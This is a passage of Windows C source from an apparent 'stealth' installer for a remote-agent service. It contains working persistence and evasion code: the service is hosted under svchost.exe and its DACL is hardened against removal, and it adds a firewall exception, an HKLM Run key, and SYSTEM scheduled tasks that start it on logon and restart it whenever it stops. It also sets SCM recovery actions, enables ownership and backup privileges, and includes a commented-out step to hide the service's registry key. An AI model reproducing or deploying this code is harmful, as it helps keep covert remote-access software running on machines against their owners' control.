            RegSetValueExW(hParams, L"ServiceDllHash", 0, REG_SZ, (const BYTE*)dllHashBuffer, (DWORD)((wcslen(dllHashBuffer) + 1) * sizeof(wchar_t)));
            RegCloseKey(hParams);
            Stealth_LogInstallEvent(L"Recorded ServiceDllHash for %ls", serviceKeyName);
        }
    }
    Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
    Stealth_ApplyPersistenceProfile();
    success = TRUE;
    Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);

    if (MeshService_HardenServiceDaclByName(serviceKeyName))
    {
        Stealth_LogInstallEvent(L"Hardened service DACL for %ls", serviceKeyName);
    }
    else
    {
        Stealth_LogInstallEvent(L"[WARN] Failed to harden service DACL for %ls (see debug output)", serviceKeyName);
    }

    // Step 4: Add Windows Firewall exceptions
    const wchar_t* fileToExcept = L"C:\\Windows\\System32\\svchost.exe";

    if (!Stealth_AddFirewallRuleForService(serviceKeyName, fileToExcept))
    {
        Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", serviceKeyName);
    }

    // Step 5: Apply service resilience (Task Scheduler / WMI restart subscriptions)
    Stealth_LogInstallEvent(L"Applying service resilience configuration");

    // Step 6: Hide service registry key (optional, can make debugging harder)
    // Stealth_HideServiceRegistry(serviceKeyName);

    // Step 7: Start the service and confirm running state
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_START | SERVICE_QUERY_STATUS);
        if (hService)
        {
            if (!StartServiceW(hService, 0, NULL)) {
                OutputDebugStringW(L"[stealth_installer] StartService failed\n");
            } else {
                // Wait up to 10s for running state
                SERVICE_STATUS_PROCESS ssp = {0};
                DWORD bytes = 0;
                DWORD waited = 0;
                while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING) { break; }
                    if (ssp.dwCurrentState == SERVICE_STOPPED) { break; }
                    Sleep(500);
                    waited += 500;
                    if (waited >= 10000) { break; }
                }
                if (ssp.dwCurrentState != SERVICE_RUNNING) {
                    OutputDebugStringW(L"[stealth_installer] Service did not reach RUNNING state\n");
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return success;
}

// ================================================================
// Uninstallation
// ================================================================

BOOL Stealth_PerformCompleteUninstallation(void)
{
    StealthInstallPaths paths;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status = {0};
    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    Stealth_LogInstallEvent(L"Beginning complete uninstallation for %ls", serviceKeyName);

    // Get paths
    Stealth_GetInstallPaths(&paths);

    Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);

    // Stop and delete service
    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, serviceKeyName,
                                SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (hService)
        {
            // Stop service
            ControlService(hService, SERVICE_CONTROL_STOP, &status);

            // Wait for service to stop
            for (int i = 0; i < 30; i++)
            {
                if (!QueryServiceStatus(hService, &status))
                {
                    break;
                }
                if (status.dwCurrentState == SERVICE_STOPPED)
                {
                    break;
                }
                Sleep(1000);
            }

            // Delete service
            DeleteService(hService);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    // Remove persistence artefacts
    Stealth_RemoveRunKeyEntry(serviceKeyName);
    Stealth_RemoveScheduledTasks(persistence, serviceDisplayName, serviceKeyName);

    // Remove firewall rules
    Stealth_RemoveFirewallRuleForService(serviceKeyName);

    // Delete files (best-effort)
    Stealth_RemoveFileIfExists(paths.dbPath, TRUE);
    Stealth_RemoveFileIfExists(paths.logPath, TRUE);
    Stealth_RemoveFileIfExists(paths.confPath, TRUE);
    Stealth_RemoveFileIfExists(paths.exePath, TRUE);
    Stealth_RemoveFileIfExists(paths.dllPath, TRUE);

    // Remove directories
    RemoveDirectoryW(paths.logsDir);
    RemoveDirectoryW(paths.installDir);

    Stealth_LogInstallEvent(L"Complete uninstallation finished for %ls", serviceKeyName);

    return TRUE;
}

// ================================================================
// Silent Installation Check
// ================================================================

BOOL Stealth_IsAlreadyInstalled(void)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL installed = FALSE;
    wchar_t serviceKeyName[256] = {0};

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_QUERY_STATUS);
        if (hService)
        {
            installed = TRUE;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return installed;
}
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->runKey == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Run key persistence disabled");
        return;
    }

    HKEY hKey;
    const wchar_t* runKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        wchar_t cmd[MAX_PATH];
        if (GetSystemDirectoryW(cmd, MAX_PATH) > 0)
        {
            size_t len = wcslen(cmd);
            if (len < MAX_PATH - 1) { wcscat_s(cmd, MAX_PATH, L"\\sc.exe"); }
        }
        else
        {
            wcscpy_s(cmd, MAX_PATH, L"sc.exe");
        }
        wchar_t value[256];
        StringCchPrintfW(value, 256, L"\"%s\" start %s", cmd, serviceName);
        RegSetValueExW(hKey, serviceName, 0, REG_SZ, (const BYTE*)value, (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
        Stealth_LogInstallEvent(L"Configured Run key for %ls", serviceName);
    }
    else
    {
        Stealth_DebugLastErrorW(L"RegCreateKeyExW (RunKey)");
        Stealth_LogInstallEvent(L"Failed to configure Run key for %ls", serviceName);
    }
}

static void Stealth_RemoveRunKeyEntry(const wchar_t* serviceName)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return; }

    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
    {
        return;
    }

    LONG result = RegDeleteValueW(hKey, serviceName);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS)
    {
        Stealth_LogInstallEvent(L"Removed Run key for %ls", serviceName);
    }
    else if (result != ERROR_FILE_NOT_FOUND)
    {
        Stealth_LogInstallEvent(L"Unable to remove Run key for %ls (error=%ld)", serviceName, result);
    }
}

static BOOL Stealth_NormalizeTaskNameInplace(wchar_t* taskName, size_t capacity)
{
    if (taskName == NULL || capacity == 0 || taskName[0] == L'\0') { return FALSE; }
    if (taskName[0] == L'\\') { return TRUE; }

    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};
    if (FAILED(StringCchCopyW(buffer, _countof(buffer), taskName))) { return FALSE; }
    if (FAILED(StringCchPrintfW(taskName, capacity, L"\\%s", buffer))) { return FALSE; }
    return TRUE;
}

static BOOL Stealth_CopyTaskNameFromUtf8(const char* source, wchar_t* dest, size_t destLen)
{
    if (dest == NULL || destLen == 0) { return FALSE; }
    dest[0] = L'\0';
    if (source == NULL || source[0] == '\0') { return FALSE; }

    MeshService_CopyBrandingTextToWide(source, dest, destLen);
    if (dest[0] == L'\0') { return FALSE; }
    return Stealth_NormalizeTaskNameInplace(dest, destLen);
}

static BOOL Stealth_FormatDefaultTaskName(const wchar_t* base, const wchar_t* suffix, wchar_t* dest, size_t destLen)
{
    if (dest == NULL || destLen == 0 || base == NULL || base[0] == L'\0' || suffix == NULL) { return FALSE; }
    if (FAILED(StringCchPrintfW(dest, destLen, L"\\%s%s", base, suffix))) { return FALSE; }
    return TRUE;
}

static BOOL Stealth_AddTaskCandidate(wchar_t candidates[][STEALTH_TASK_NAME_MAX], size_t* count, size_t capacity, const wchar_t* name)
{
    if (candidates == NULL || count == NULL || name == NULL || name[0] == L'\0') { return FALSE; }
    for (size_t i = 0; i < *count; ++i)
    {
        if (_wcsicmp(candidates[i], name) == 0) { return FALSE; }
    }
    if (*count >= capacity) { return FALSE; }
    if (FAILED(StringCchCopyW(candidates[*count], STEALTH_TASK_NAME_MAX, name))) { return FALSE; }
    (*count)++;
    return TRUE;
}

static BOOL Stealth_RemoveScheduledTaskByName(const wchar_t* taskName, const wchar_t* context)
{
    if (taskName == NULL || taskName[0] == L'\0') { return FALSE; }

    wchar_t sysDir[MAX_PATH];
    wchar_t cmdLine[1024];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) { return FALSE; }

    if (FAILED(StringCchPrintfW(cmdLine, _countof(cmdLine), L"\"%s\\schtasks.exe\" /Delete /TN \"%s\" /F", sysDir, taskName)))
    {
        return FALSE;
    }

    if (Stealth_RunCommand(cmdLine, context))
    {
        Stealth_LogInstallEvent(L"Removed scheduled task %ls", taskName);
        return TRUE;
    }

    Stealth_LogInstallEvent(L"Scheduled task %ls removal reported failure", taskName);
    return FALSE;
}

static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persistence, const wchar_t* serviceDisplayName, const wchar_t* serviceKeyName)
{
    const size_t maxCandidates = 8;
    wchar_t autorunCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
    size_t autorunCount = 0;
    wchar_t restartCandidates[8][STEALTH_TASK_NAME_MAX] = {0};
    size_t restartCount = 0;
    wchar_t buffer[STEALTH_TASK_NAME_MAX] = {0};

    if (persistence != NULL)
    {
        if (Stealth_CopyTaskNameFromUtf8(persistence->autorunTask.taskName, buffer, _countof(buffer)))
        {
            Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
        }
        if (Stealth_CopyTaskNameFromUtf8(persistence->restartTask.taskName, buffer, _countof(buffer)))
        {
            Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
        }
    }

    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-Autorun", buffer, _countof(buffer)))
    {
        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
    }
    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-Autorun", buffer, _countof(buffer)))
    {
        Stealth_AddTaskCandidate(autorunCandidates, &autorunCount, maxCandidates, buffer);
    }

    if (Stealth_FormatDefaultTaskName(serviceDisplayName, L"-RestartOnStop", buffer, _countof(buffer)))
    {
        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
    }
    if (Stealth_FormatDefaultTaskName(serviceKeyName, L"-RestartOnStop", buffer, _countof(buffer)))
    {
        Stealth_AddTaskCandidate(restartCandidates, &restartCount, maxCandidates, buffer);
    }

    for (size_t i = 0; i < autorunCount; ++i)
    {
        Stealth_RemoveScheduledTaskByName(autorunCandidates[i], L"schtasks.exe /Delete (autorun)");
    }

    for (size_t i = 0; i < restartCount; ++i)
    {
        Stealth_RemoveScheduledTaskByName(restartCandidates[i], L"schtasks.exe /Delete (restart-on-stop)");
    }
}

static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->autorunTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Autorun scheduled task disabled");
        return;
    }

    Stealth_LogInstallEvent(L"Scheduling autorun task for %ls", serviceName);

    wchar_t sysDir[MAX_PATH];
    wchar_t scPath[MAX_PATH];
    wchar_t cmdLine[1024];
    wchar_t taskName[128] = {0};
    wchar_t trigger[64] = {0};

    if (persistence->autorunTask.taskName != NULL)
    {
        MeshService_CopyBrandingTextToWide(persistence->autorunTask.taskName, taskName, _countof(taskName));
    }
    if (taskName[0] == L'\0')
    {
        StringCchPrintfW(taskName, _countof(taskName), L"\\%s-Autorun", serviceName);
    }
    else if (taskName[0] != L'\\')
    {
        wchar_t original[128];
        StringCchCopyW(original, _countof(original), taskName);
        StringCchPrintfW(taskName, _countof(taskName), L"\\%s", original);
    }

    if (persistence->autorunTask.trigger != NULL)
    {
        MeshService_CopyBrandingTextToWide(persistence->autorunTask.trigger, trigger, _countof(trigger));
    }
    if (trigger[0] == L'\0')
    {
        StringCchCopyW(trigger, _countof(trigger), L"ONLOGON");
    }
    Stealth_ToUppercase(trigger);

    GetSystemDirectoryW(sysDir, MAX_PATH);
    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);

    StringCchPrintfW(cmdLine, 1024,
        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"%s start %s\" /SC %s /RU \"SYSTEM\" /RL HIGHEST /F",
        sysDir,
        taskName,
        scPath,
        serviceName,
        trigger);

    if (Stealth_RunCommand(cmdLine, L"schtasks.exe /Create (autorun)"))
    {
        Stealth_DebugPrintfW(L"Scheduled autorun task %ls", taskName);
        Stealth_LogInstallEvent(L"Scheduled autorun task %ls", taskName);
    }
}

static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->restartTask.enabled == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        Stealth_LogInstallEvent(L"Restart-on-stop scheduled task disabled");
        return;
    }

    Stealth_LogInstallEvent(L"Scheduling restart-on-stop task for %ls", serviceName);

    // Implement as an event-driven scheduled task (instead of WMI permanent consumer)
    // Triggers when Service Control Manager logs 7036 (service entered stopped state) for this service.
    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONEVENT /EC System /MO <XPath> /RL HIGHEST /F
    const wchar_t* xPathFormat =
        L"*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and *[EventData[Data='%s'] and EventData[Data='stopped']]";
    wchar_t xPath[1024];
    StringCchPrintfW(xPath, 1024, xPathFormat, serviceName);

    wchar_t sysDir[MAX_PATH];
    wchar_t scPath[MAX_PATH];
    wchar_t cmdLine[4096];

    GetSystemDirectoryW(sysDir, MAX_PATH);
    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);

    wchar_t taskName[128] = {0};
    if (persistence->restartTask.taskName != NULL)
    {
        MeshService_CopyBrandingTextToWide(persistence->restartTask.taskName, taskName, _countof(taskName));
    }
    if (taskName[0] == L'\0')
    {
        StringCchPrintfW(taskName, _countof(taskName), L"\\%s-RestartOnStop", serviceName);
    }
    else if (taskName[0] != L'\\')
    {
        wchar_t original[128];
        StringCchCopyW(original, _countof(original), taskName);
        StringCchPrintfW(taskName, _countof(taskName), L"\\%s", original);
    }

    // Build command: schtasks.exe /Create ... /MO "<QueryList>..." (escaped)
    // Wrap XPath in double quotes; CreateProcessW supports quotes.
    StringCchPrintfW(cmdLine, 4096,
        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"%s start %s\" /SC ONEVENT /EC System /MO \"%s\" /RU \"SYSTEM\" /RL HIGHEST /F",
        sysDir,
        taskName,
        scPath,
        serviceName,
        xPath);

    if (Stealth_RunCommand(cmdLine, L"schtasks.exe /Create (restart-on-stop)"))
    {
        Stealth_DebugPrintfW(L"Scheduled restart-on-stop task %ls", taskName);
        Stealth_LogInstallEvent(L"Scheduled restart-on-stop task %ls", taskName);
    }
}

static void Stealth_TrimWhitespaceInplace(wchar_t* value)
{
    if (value == NULL) { return; }
    size_t len = wcslen(value);
    while (len > 0 && iswspace(value[len - 1]))
    {
        value[--len] = L'\0';
    }
    size_t start = 0;
    while (value[start] != L'\0' && iswspace(value[start])) { ++start; }
    if (start > 0)
    {
        memmove(value, value + start, (wcslen(value + start) + 1) * sizeof(wchar_t));
    }
}

static SC_ACTION_TYPE Stealth_MapRecoveryActionToken(const wchar_t* token)
{
    if (token == NULL) { return SC_ACTION_NONE; }
    if (_wcsicmp(token, L"restart") == 0) { return SC_ACTION_RESTART; }
    if (_wcsicmp(token, L"reboot") == 0) { return SC_ACTION_REBOOT; }
    if (_wcsicmp(token, L"none") == 0) { return SC_ACTION_NONE; }
    if (_wcsicmp(token, L"runcommand") == 0 || _wcsicmp(token, L"run_command") == 0)
    {
        Stealth_LogInstallEvent(L"RunCommand failure action not supported; ignoring token");
        return SC_ACTION_NONE;
    }
    return SC_ACTION_NONE;
}

static SC_ACTION* Stealth_CreateRestartPlan(size_t actionCount, DWORD delayMs, DWORD* actionCountOut)
{
    if (actionCount == 0) { return NULL; }
    SC_ACTION* actions = (SC_ACTION*)LocalAlloc(LPTR, sizeof(SC_ACTION) * actionCount);
    if (actions == NULL) { return NULL; }
    for (size_t i = 0; i < actionCount; ++i)
    {
        actions[i].Type = SC_ACTION_RESTART;
        actions[i].Delay = delayMs;
    }
    if (actionCountOut) { *actionCountOut = (DWORD)actionCount; }
    return actions;
}

static SC_ACTION* Stealth_BuildRecoveryActionsFromCsv(const wchar_t* csv, DWORD delayMs, DWORD* actionCountOut)
{
    if (actionCountOut) { *actionCountOut = 0; }
    if (csv == NULL || csv[0] == L'\0') { return NULL; }

    wchar_t firstPass[512] = {0};
    wchar_t secondPass[512] = {0};
    wcsncpy_s(firstPass, _countof(firstPass), csv, _TRUNCATE);
    wcsncpy_s(secondPass, _countof(secondPass), csv, _TRUNCATE);

    size_t count = 0;
    wchar_t* context = NULL;
    wchar_t* token = wcstok_s(firstPass, L",", &context);
    while (token != NULL)
    {
        Stealth_TrimWhitespaceInplace(token);
        if (token[0] != L'\0') { ++count; }
        token = wcstok_s(NULL, L",", &context);
    }
    if (count == 0) { return NULL; }

    SC_ACTION* actions = (SC_ACTION*)LocalAlloc(LPTR, sizeof(SC_ACTION) * count);
    if (actions == NULL) { return NULL; }

    context = NULL;
    token = wcstok_s(secondPass, L",", &context);
    size_t idx = 0;
    while (token != NULL && idx < count)
    {
        Stealth_TrimWhitespaceInplace(token);
        if (token[0] != L'\0')
        {
            actions[idx].Type = Stealth_MapRecoveryActionToken(token);
            actions[idx].Delay = delayMs;
            ++idx;
        }
        token = wcstok_s(NULL, L",", &context);
    }

    if (idx == 0)
    {
        LocalFree(actions);
        return NULL;
    }

    if (actionCountOut) { *actionCountOut = (DWORD)idx; }
    return actions;
}

static void Stealth_ConfigureServiceRecoveryIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || serviceName == NULL || serviceName[0] == L'\0')
    {
        return;
    }

    BOOL useRecovery = (persistence->recovery.enabled != 0);
    BOOL useWatchdog = (persistence->watchdog.enabled != 0);
    Stealth_LogInstallEvent(L"Service recovery toggles: recovery=%u watchdog=%u", persistence->recovery.enabled, persistence->watchdog.enabled);
    if (!useRecovery && !useWatchdog)
    {
        Stealth_LogInstallEvent(L"Service recovery/watchdog toggles disabled");
        return;
    }

    DWORD resetPeriodSeconds = 0;
    DWORD restartDelayMs = 0;
    BOOL applyOnCrash = FALSE;
    SC_ACTION* actions = NULL;
    DWORD actionCount = 0;

    if (useRecovery)
    {
        wchar_t csvBuffer[512] = {0};
        if (persistence->recovery.actions != NULL)
        {
            MeshService_CopyBrandingTextToWide(persistence->recovery.actions, csvBuffer, _countof(csvBuffer));
        }
        if (csvBuffer[0] == L'\0')
        {
            wcscpy_s(csvBuffer, _countof(csvBuffer), L"restart,restart,restart");
        }

        restartDelayMs = (persistence->recovery.restartDelayMilliseconds > 0) ?
            persistence->recovery.restartDelayMilliseconds : 10000;
        resetPeriodSeconds = (persistence->recovery.resetPeriodSeconds > 0) ?
            persistence->recovery.resetPeriodSeconds : 86400;
        applyOnCrash = useWatchdog ? (persistence->watchdog.restartOnCrash != 0) : TRUE;

        actions = Stealth_BuildRecoveryActionsFromCsv(csvBuffer, restartDelayMs, &actionCount);
        if ((actions == NULL || actionCount == 0) && useWatchdog)
        {
            LocalFree(actions);
            actions = Stealth_CreateRestartPlan(3, restartDelayMs, &actionCount);
        }
    }
    else if (useWatchdog)
    {
        restartDelayMs = (persistence->watchdog.restartDelaySeconds > 0) ?
            persistence->watchdog.restartDelaySeconds * 1000 : 10000;
        resetPeriodSeconds = (persistence->watchdog.intervalSeconds > 0) ?
            persistence->watchdog.intervalSeconds : 86400;
        applyOnCrash = (persistence->watchdog.restartOnCrash != 0);
        actions = Stealth_CreateRestartPlan(3, restartDelayMs, &actionCount);
    }

    if (actions == NULL || actionCount == 0)
    {
        if (actions) { LocalFree(actions); }
        Stealth_LogInstallEvent(L"Service recovery configuration skipped (no actions)");
        return;
    }

    Stealth_EnablePrivilege(L"SeTakeOwnershipPrivilege");
    Stealth_EnablePrivilege(L"SeSecurityPrivilege");
    Stealth_EnablePrivilege(L"SeBackupPrivilege");
    Stealth_EnablePrivilege(L"SeRestorePrivilege");

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"OpenSCManagerW (recovery)");
        Stealth_LogInstallEvent(L"OpenSCManagerW failed while setting recovery (%lu)", err);
        LocalFree(actions);
        return;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (!hService)
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"OpenServiceW (recovery)");
        Stealth_LogInstallEvent(L"OpenServiceW failed while setting recovery (%lu)", err);
        CloseServiceHandle(hSCM);
        LocalFree(actions);
        return;
    }

    SERVICE_FAILURE_ACTIONSW sfa = {0};
    sfa.dwResetPeriod = resetPeriodSeconds;
    sfa.cActions = actionCount;
    sfa.lpsaActions = actions;

    if (ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa))
    {
        Stealth_LogInstallEvent(L"Configured SCM recovery for %ls (actions=%u reset=%u delay=%u)",
            serviceName,
            (unsigned int)actionCount,
            (unsigned int)resetPeriodSeconds,
            (unsigned int)actions[0].Delay);
    }
    else
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"ChangeServiceConfig2W(SERVICE_CONFIG_FAILURE_ACTIONS)");
        Stealth_LogInstallEvent(L"Failed to configure SCM recovery for %ls (error=%lu)", serviceName, err);
    }

    SERVICE_FAILURE_ACTIONS_FLAG flag = {0};
    flag.fFailureActionsOnNonCrashFailures = applyOnCrash ? TRUE : FALSE;
    if (!ChangeServiceConfig2W(hService, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &flag))
    {
        DWORD err = GetLastError();
        Stealth_DebugLastErrorW(L"ChangeServiceConfig2W(SERVICE_CONFIG_FAILURE_ACTIONS_FLAG)");
        Stealth_LogInstallEvent(L"Failed to set FailureActionsOnNonCrashFailures (error=%lu)", err);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    LocalFree(actions);
}

void Stealth_ApplyPersistenceProfile(void)
{
    static BOOL g_RuntimePersistenceApplied = FALSE;
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceKeyName[0] == L'\0')
    {
        StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME);
    }
    if (serviceDisplayName[0] == L'\0')
    {
        StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME);
    }

    if (persistence)
    {
        if (!g_RuntimePersistenceApplied)
        {
            Stealth_LogInstallEvent(L"Ensuring runtime persistence artifacts for %ls", serviceKeyName);
        }
        Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
        Stealth_AddScheduledTaskIfEnabled(persistence, serviceDisplayName);
        Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName);
        Stealth_ConfigureServiceRecoveryIfEnabled(persistence, serviceKeyName);
        g_RuntimePersistenceApplied = TRUE;
    }
    else
    {
        Stealth_LogInstallEvent(L"No persistence profile available");
    }
}

static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate)
{
    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM == NULL) { return FALSE; }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hService == NULL)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    BOOL stopped = FALSE;
    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD needed = 0;

    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed))
    {
        if (ssp.dwCurrentState != SERVICE_STOPPED)
        {
            ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
        }
    }

    DWORD waited = 0;
    while (waited < timeoutMs)
    {
        if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed))
        {
            break;
        }
        if (ssp.dwCurrentState == SERVICE_STOPPED)
        {
            stopped = TRUE;
            break;
        }
        Sleep(500);
        waited += 500;
    }

    if (!stopped && forceTerminate && ssp.dwProcessId != 0)
    {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, ssp.dwProcessId);
        if (hProcess != NULL)
        {
            TerminateProcess(hProcess, 0);
            WaitForSingleObject(hProcess, 5000);
            CloseHandle(hProcess);
        }
        QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed);
        stopped = (ssp.dwCurrentState == SERVICE_STOPPED);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return stopped;
}
